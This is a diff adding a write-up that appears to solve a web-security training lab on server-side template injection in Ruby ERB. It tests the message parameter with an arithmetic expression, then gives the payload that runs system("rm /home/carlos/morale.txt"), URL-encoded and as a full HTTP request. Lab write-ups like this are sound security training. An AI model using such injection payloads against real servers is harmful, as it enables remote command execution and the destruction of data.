@@ -1,0 +1,41 @@
+Basic server-side template injection
+
+What.
+
+Checking the stock of a products gets us an out of stock error in the URL
+
+https://ac6d1fd71e0fbf9c808a198100c100a7.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock
+
+The lab gives us a hint that the page is using embedded Ruby (ERB). Here's the templace documentation page:
+https://puppet.com/docs/puppet/5.5/lang_template_erb.html
+
+<%= Expression %> is used to evaluage an expression
+
+Let's try to test if a mathematical expression gives us a valid result:
+
+https://ac6d1fd71e0fbf9c808a198100c100a7.web-security-academy.net/?message=%3C%25%3d+4-2+%25%3E
+
+We get 2, nice. That means we can run commands.
+
+Checking the Ruby doc we find the system() function:
+https://ruby-doc.org/docs/ruby-doc-bundle/Manual/man-1.4/function.html#system
+
+Based on the details provided by the lab description, we build a payload to delete carlos's morale:
+<%= system("rm /home/carlos/morale.txt") %>
+
+and add it to our URL:
+https://ac6d1fd71e0fbf9c808a198100c100a7.web-security-academy.net/?message=%3C%25+system(%22rm+/home/carlos/morale.txt%22)+%25%3E
+
+Request:
+
+GET /?message=%3C%25+system(%22rm+/home/carlos/morale.txt%22)+%25%3E HTTP/1.1
+Host: ac6d1fd71e0fbf9c808a198100c100a7.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: session=JOBkS5iX8MuZdWeVZldgkPDfswzhg8at
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
